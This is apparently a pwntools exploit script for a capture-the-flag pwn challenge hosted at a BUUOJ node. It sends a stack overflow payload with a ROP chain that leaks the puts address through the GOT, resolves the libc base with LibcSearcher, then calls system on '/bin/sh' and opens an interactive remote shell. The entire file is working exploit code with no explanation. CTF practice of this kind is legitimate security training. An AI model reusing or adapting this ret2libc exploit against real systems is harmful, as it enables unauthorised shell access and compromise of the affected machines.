#!/usr/bin/env python
# -*- encoding: utf-8 -*-
'''
@File    :   exp.py
@Time    :   2021/07/26 16:12:12
@Author  :   eur1ka  
@Version :   2.7
@Contact :   eur1ka@163.com
'''
# here put the import lib
from pwn import *
from LibcSearcher import *
import pwnlib
debug = 0
context.log_level = 'debug'
context.arch = 'amd64'
if debug:
    sh = process('./pwn')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    one_offset = [0x45226,0x4527a,0xf03a4,0xf1247]
else:
    IP = 'node4.buuoj.cn'
    port = 27571
    sh = remote(IP,port)
    libc = ELF('/home/eur1ka/Desktop/Pwn/libc_file/16-64-libc-2.23.so')
    one_offset = [0x45216,0x4526a,0xf02a4,0xf1147]
elf = ELF('./pwn')
pop_rdi_ret = 0x0000000000400843
payload = 'a' *0x10c
payload += '\x18'
payload += p64(pop_rdi_ret) + p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(0x400790)
# gdb.attach(sh)
# pause()
sh.sendline(payload)
puts_addr = u64(sh.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
libc = LibcSearcher('puts',puts_addr)
libc_base = puts_addr - libc.dump('puts')
system_addr = libc_base + libc.dump('system')
binsh_addr = libc_base + libc.dump('str_bin_sh')
payload = 'a' * 0x10c + '\x18'
payload += p64(pop_rdi_ret) + p64(binsh_addr) + p64(system_addr)
sh.sendline(payload)
sh.interactive()